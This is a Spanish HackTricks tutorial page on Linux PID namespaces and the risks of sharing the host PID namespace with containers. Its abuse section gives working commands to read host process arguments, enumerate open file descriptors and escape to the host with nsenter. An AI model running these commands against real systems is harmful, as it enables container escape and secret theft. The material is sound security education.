# Namespace de PID

{{#include ../../../../../banners/hacktricks-training.md}}

## Descripción general

El namespace de PID controla cómo se numeran los procesos y qué procesos son visibles. Por eso un container puede tener su propio PID 1 aunque no sea una máquina real. Dentro del namespace, el workload ve lo que parece un árbol de procesos local. Fuera del namespace, el host sigue viendo los PIDs reales del host y todo el panorama de procesos.

Desde el punto de vista de la seguridad, el namespace de PID es importante porque la visibilidad de los procesos es valiosa. Una vez que un workload puede ver los procesos del host, puede ser capaz de observar nombres de servicios, argumentos de línea de comandos, secretos pasados como argumentos de procesos, estado derivado del entorno a través de `/proc` y posibles objetivos para entrar en namespaces. Si puede hacer algo más que limitarse a ver esos procesos, por ejemplo enviar señales o usar ptrace bajo las condiciones adecuadas, el problema se vuelve mucho más grave.

## Funcionamiento

Un nuevo namespace de PID comienza con su propia numeración interna de procesos. El primer proceso creado dentro de él se convierte en el PID 1 desde el punto de vista del namespace, lo que también significa que obtiene una semántica especial similar a la de init para los hijos huérfanos y el comportamiento de las señales. Esto explica muchas peculiaridades de los containers relacionadas con los procesos init, la recolección de procesos zombie y el motivo por el que a veces se utilizan pequeños wrappers de init en los containers.

La lección de seguridad importante es que un proceso puede parecer aislado porque solo ve su propio árbol de PIDs, pero ese aislamiento puede eliminarse deliberadamente. Docker expone esto mediante `--pid=host`, mientras que Kubernetes lo hace mediante `hostPID: true`. Una vez que el container se une al namespace de PID del host, el workload ve directamente los procesos del host y muchas rutas de ataque posteriores se vuelven mucho más realistas.

## Lab

Para crear manualmente un namespace de PID:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
El shell ahora ve una vista privada de los procesos. La flag `--mount-proc` es importante porque monta una instancia de procfs que coincide con el nuevo namespace de PID, haciendo coherente la lista de procesos desde dentro.

Para comparar el comportamiento del contenedor:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
La diferencia es inmediata y fácil de entender, por lo que este es un buen primer laboratorio para los lectores.

## Uso del runtime

Los contenedores normales en Docker, Podman, containerd y CRI-O obtienen su propio PID namespace. Los Kubernetes Pods normalmente también reciben una vista de PID aislada, a menos que el workload solicite explícitamente compartir el PID del host. Los entornos LXC/Incus dependen de la misma primitiva del kernel, aunque los casos de uso de system containers pueden exponer árboles de procesos más complicados y fomentar más atajos de debugging.

La misma regla se aplica en todas partes: si el runtime decidió no aislar el PID namespace, eso supone una reducción deliberada del límite del contenedor.

## Misconfiguraciones

La misconfiguración canónica es compartir el PID del host. Los equipos suelen justificarlo por conveniencia para debugging, monitoring o gestión de servicios, pero siempre debe tratarse como una excepción de seguridad significativa. Aunque el contenedor no tenga una write primitive inmediata sobre los procesos del host, la visibilidad por sí sola puede revelar mucha información sobre el sistema. Una vez que se añaden capacidades como `CAP_SYS_PTRACE` o un acceso útil a procfs, el riesgo aumenta considerablemente.

Otro error es asumir que, como el workload no puede matar ni hacer ptrace sobre los procesos del host por defecto, compartir el PID del host es inofensivo. Esa conclusión ignora el valor de la enumeración, la disponibilidad de targets para entrar en namespaces y la forma en que la visibilidad de los PID se combina con otros controles debilitados.

## Abuso

Si se comparte el PID namespace del host, un atacante puede inspeccionar los procesos del host, obtener los argumentos de los procesos, identificar servicios interesantes, localizar PIDs candidatos para `nsenter` o combinar la visibilidad de procesos con privilegios relacionados con ptrace para interferir con workloads del host o adyacentes. En algunos casos, simplemente ver el proceso de larga duración adecuado basta para replantear el resto del attack plan.

El primer paso práctico siempre es confirmar que los procesos del host son realmente visibles:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Una vez que los PID del host son visibles, los argumentos de los procesos y los objetivos de entrada de los namespaces suelen convertirse en la fuente de información más útil:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Si `nsenter` está disponible y existen privilegios suficientes, comprueba si un proceso visible del host puede utilizarse como puente entre namespaces:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Incluso cuando la entrada está bloqueada, compartir los PID del host ya resulta valioso porque revela la disposición de los servicios, los componentes en ejecución y los procesos privilegiados candidatos a los que atacar después.

La visibilidad de los PID del host también hace más realista el abuso de descriptores de archivo. Si un proceso privilegiado del host o una carga de trabajo vecina tiene abierto un archivo o socket sensible, el atacante podría inspeccionar `/proc/<pid>/fd/` y reutilizar ese descriptor, dependiendo de la propiedad, las opciones de montaje de procfs y el modelo del servicio objetivo.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Estos comandos son útiles porque indican si `hidepid=1` o `hidepid=2` reducen la visibilidad entre procesos y si descriptores obviamente interesantes, como archivos secretos abiertos, logs o sockets Unix, son visibles.

### Ejemplo completo: PID del host + `nsenter`

Compartir los PID del host se convierte en un escape directo del host cuando el proceso también tiene privilegios suficientes para unirse a los namespaces del host:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Si el comando se ejecuta correctamente, el proceso del contenedor ahora se está ejecutando en los namespaces de mount, UTS, network, IPC y PID del host. El impacto es un compromiso inmediato del host.

Incluso cuando falta el propio `nsenter`, puede lograrse el mismo resultado mediante el binario del host si el sistema de archivos del host está montado:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Notas recientes del runtime

Algunos ataques relevantes para los PID namespaces no son errores de configuración tradicionales de `hostPID: true`, sino errores de implementación del runtime relacionados con cómo se aplican las protecciones de procfs durante la configuración del contenedor.

#### Condición de carrera de `maskedPaths` hacia el procfs del host

En versiones vulnerables de `runc`, los atacantes capaces de controlar la imagen del contenedor o la carga de trabajo de `runc exec` podían provocar una condición de carrera en la fase de enmascaramiento, reemplazando el `/dev/null` del contenedor por un symlink hacia una ruta sensible de procfs, como `/proc/sys/kernel/core_pattern`. Si la condición de carrera tenía éxito, el bind mount de la ruta enmascarada podía terminar en el destino equivocado y exponer los knobs de procfs globales del host al nuevo contenedor.<sup>[[1]](#references)</sup>

Comando útil de revisión:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Esto es importante porque el impacto final puede ser el mismo que el de una exposición directa de procfs: `core_pattern` o `sysrq-trigger` modificables, seguidos de ejecución de código en el host o una denegación de servicio.

#### Namespace injection con `insject`

Las herramientas de Namespace injection, como `insject`, muestran que la interacción con un PID namespace no siempre requiere entrar previamente en el namespace objetivo antes de crear el proceso. Un helper puede conectarse posteriormente, usar `setns()` y ejecutar código mientras conserva la visibilidad del espacio de PID objetivo:<sup>[[2]](#references)</sup>
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Este tipo de técnica es relevante principalmente para debugging avanzado, tooling ofensivo y workflows de post-exploitation en los que el contexto del namespace debe unirse después de que el runtime ya haya inicializado la carga de trabajo.

### Patrones de Abuso de FD

Hay dos patrones que conviene señalar explícitamente cuando los PIDs del host son visibles. Primero, un proceso privilegiado puede mantener abierto un file descriptor sensible durante `execve()` porque no se marcó con `O_CLOEXEC`. Segundo, los servicios pueden pasar file descriptors a través de Unix sockets mediante `SCM_RIGHTS`. En ambos casos, el objeto interesante ya no es el pathname, sino el handle ya abierto que un proceso con menos privilegios puede heredar o recibir.

Esto es importante en el trabajo con containers porque el handle puede apuntar a `docker.sock`, a un log privilegiado, a un archivo de secrets del host o a otro objeto de alto valor, incluso cuando no se puede acceder directamente a la ruta desde el filesystem del container.

## Comprobaciones

El propósito de estos comandos es determinar si el proceso tiene una vista privada de los PIDs o si ya puede enumerar un panorama de procesos mucho más amplio.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Qué es interesante aquí:

- Si la lista de procesos contiene servicios obvios del host, probablemente ya esté habilitada la compartición de PID del host.
- Ver únicamente un árbol diminuto y local del container es la línea base normal; ver `systemd`, `dockerd` o daemons no relacionados no lo es.
- Una vez visibles los PID del host, incluso la información de procesos de solo lectura resulta útil para el reconocimiento.

Si descubres un container ejecutándose con la compartición de PID del host, no lo trates como una diferencia estética. Es un cambio importante en lo que el workload puede observar y potencialmente afectar.

## Referencias

- [1] [Security advisory de runc: escape del container mediante abuso de "masked path" debido a condiciones de carrera en montajes (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Tool Release – insject: un Namespace Injector de Linux](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)

{{#include ../../../../../banners/hacktricks-training.md}}
